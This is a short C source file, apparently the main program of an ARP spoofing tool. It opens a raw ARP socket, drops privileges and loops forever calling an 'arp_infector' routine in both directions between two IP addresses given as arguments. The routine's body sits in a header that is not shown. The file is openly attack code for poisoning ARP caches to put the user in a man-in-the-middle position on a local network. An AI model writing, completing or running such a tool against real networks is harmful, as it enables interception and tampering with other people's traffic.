#include "lobo.h"

int main(int argc,char** argv)
{
    if(argc!=3)
    {
        fprintf(stderr,"Usage: <%s> <first IP> <second IP>\n",argv[0]);
        exit(EXIT_FAILURE);
    }

    int sock_fd;
    sock_fd=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_ARP));
    check_function(sock_fd,"socket");
    setuid(getuid());

    while(TRUE)
    {
        arp_infector(sock_fd,argv[1],argv[2]);
        arp_infector(sock_fd,argv[2],argv[1]);
    }

    return 0;
}